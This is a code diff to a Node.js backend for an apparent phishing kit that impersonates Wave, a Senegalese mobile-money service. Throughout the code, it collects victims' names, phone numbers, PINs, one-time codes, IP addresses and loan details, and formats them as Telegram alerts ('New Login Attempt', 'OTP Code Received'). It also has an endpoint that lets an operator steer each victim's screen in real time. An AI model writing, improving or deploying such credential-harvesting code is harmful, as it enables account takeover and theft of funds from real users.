@@ -8,6 +8,7 @@ require('dotenv').config();
 const express  = require('express');
 const cors     = require('cors');
 const fetch    = require('node-fetch');
+const path     = require('path');
 const { v4: uuidv4 } = require('uuid');
 
 const app  = express();
@@ -28,6 +29,11 @@ app.use(cors({ origin: process.env.FRONTEND_ORIGIN || '*' }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// ── Serve index.html at root ──────────────────────────────────────
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 // ── In-memory session store ───────────────────────────────────────
 // Structure: { [sessionId]: { phone, pin, firstName, lastName, otp, status, createdAt } }
 const sessions = {};
@@ -43,8 +49,7 @@ setInterval(() => {
 // ── Telegram helpers ──────────────────────────────────────────────
 
 /**
- * Send a Telegram message. Uses MarkdownV2 for formatting.
- * Special chars are escaped automatically.
+ * Send a Telegram message using HTML parse mode.
  */
 async function tgSend(text) {
   try {
@@ -76,18 +81,12 @@ function now() {
   });
 }
 
-/** Get rough flag emoji for country code */
-function flag(phone) {
-  // Senegal numbers start with 7 after +221
+/** Flag emoji */
+function flag() {
   return '🇸🇳';
 }
 
 // ── Routes ────────────────────────────────────────────────────────
-
-/** Health check */
-app.get('/', (req, res) => {
-  res.json({ status: 'ok', service: 'Wave Smart Backend', time: new Date().toISOString() });
-});
 
 /**
  * POST /api
@@ -119,7 +118,7 @@ app.post('/api', async (req, res) => {
         `🔐 <b>New Login Attempt</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
-        `📱 <b>Phone:</b> ${flag(phone)} +221 ${phone}\n` +
+        `📱 <b>Phone:</b> ${flag()} +221 ${phone}\n` +
         `🔑 <b>PIN:</b> <code>${pin}</code>\n` +
         `🕐 <b>Time:</b> ${now()}\n` +
         `🌐 <b>IP:</b> <code>${ip}</code>\n` +
@@ -148,7 +147,7 @@ app.post('/api', async (req, res) => {
         `📟 <b>OTP Code Received</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `👤 <b>Name:</b> ${session.firstName} ${session.lastName}\n` +
-        `📱 <b>Phone:</b> ${flag(session.phone)} +221 ${session.phone}\n` +
+        `📱 <b>Phone:</b> ${flag()} +221 ${session.phone}\n` +
         `🔑 <b>PIN:</b> <code>${session.pin}</code>\n` +
         `📟 <b>OTP:</b> <code>${otp}</code>\n` +
         `🕐 <b>Time:</b> ${now()}\n` +
@@ -170,7 +169,7 @@ app.post('/api', async (req, res) => {
         `💰 <b>Loan Application</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
-        `📱 <b>Phone:</b> ${flag(phone)} +221 ${phone}\n` +
+        `📱 <b>Phone:</b> ${flag()} +221 ${phone}\n` +
         `💵 <b>Amount:</b> ${Number(amount).toLocaleString('fr-FR')} FCFA\n` +
         `📅 <b>Duration:</b> ${duration} months\n` +
         `💼 <b>Income:</b> ${Number(income).toLocaleString('fr-FR')} FCFA/mo\n` +
@@ -190,8 +189,7 @@ app.post('/api', async (req, res) => {
 /**
  * GET /api?action=check_status&sessionId=...
  * Returns current session status — used by the frontend to poll
- * after a login attempt. You can update session.status from your
- * Telegram bot using the /api/set_status endpoint below.
+ * after a login attempt.
  */
 app.get('/api', (req, res) => {
   const { action, sessionId } = req.query;
@@ -207,15 +205,8 @@ app.get('/api', (req, res) => {
 
 /**
  * POST /api/set_status
- * Allows your Telegram bot (or any webhook) to update the status
- * of a session. The frontend polls check_status and reacts to:
- *   approved   → proceeds to OTP screen
- *   wrong_pin  → shows error, clears PIN
- *   wrong_code → shows error, clears OTP
- *   continue   → shows "insufficient funds" message
- *
+ * Update the status of a session.
  * Body: { sessionId, status, secret }
- * The `secret` must match ADMIN_SECRET in .env for security.
  */
 app.post('/api/set_status', (req, res) => {
   const { sessionId, status, secret } = req.body;
@@ -240,8 +231,8 @@ app.post('/api/set_status', (req, res) => {
 });
 
 /**
- * GET /api/sessions
- * Lists all active sessions (admin use only, protect in production).
+ * GET /api/sessions?secret=...
+ * Lists all active sessions (admin only).
  */
 app.get('/api/sessions', (req, res) => {
   const secret = req.query.secret || req.headers['x-admin-secret'];
